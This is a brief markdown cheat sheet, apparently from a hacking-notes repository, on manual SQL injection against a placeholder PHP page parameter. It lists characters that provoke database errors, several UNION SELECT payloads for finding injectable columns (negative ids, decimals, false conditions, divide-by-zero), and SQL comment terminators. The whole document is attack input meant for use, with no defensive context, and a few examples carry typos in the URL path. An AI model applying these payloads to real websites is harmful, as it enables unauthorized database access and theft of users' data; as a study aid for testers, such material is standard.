# Problem Solving Help

- [~]🥴Error-causing characters🥴[~]
    - Using **Closed Bracket** )<br/>
 ex) https://www.target.com/index.php?id=1)

   - Using **Single Quote** '<br/>
 ex) https://www.target.com/index.php?id=1'

   - Using **Double Quote** "<br/>
 ex) https://www.target.com/index.php?id=1"
 - [~]🤕Find weak column🤕[~]
   - Using **Ridiculous Value**<br/>
 ex) https://www.target.com/index.php?id=[ 2134, null, bybysql ] union select 1,2,3--
   - Using **Negative Quantity**<br/>
 ex) https://www.target.com/index/php?id=-1 union select 1,2,3--
   - Using **Decimal**<br/>
 ex) https://www.target.com/index/php?id=[ 1.1, .1 ] union select 1,2,3--
   - Using **Defualt Value**<br/>
 ex) https://www.target.com/index/php?id= union select 1,2,3--
   - Using **False Parameter**<br/>
 ex) https://www.target.com/index/php?id=1 or 1=2 union select 1,2,3--
   - Using **Divide by 0 means**<br/>
 ex) https://www.target.com/index/php?id=[ 1/0, 1+div+0 ]union select 1,2,3--
 - [~]📃Types of annotations📃[~]<br/>
 [ **--**, **#(%23)**, __/* */__, **--+**, **---**, **--+-**, **;** ]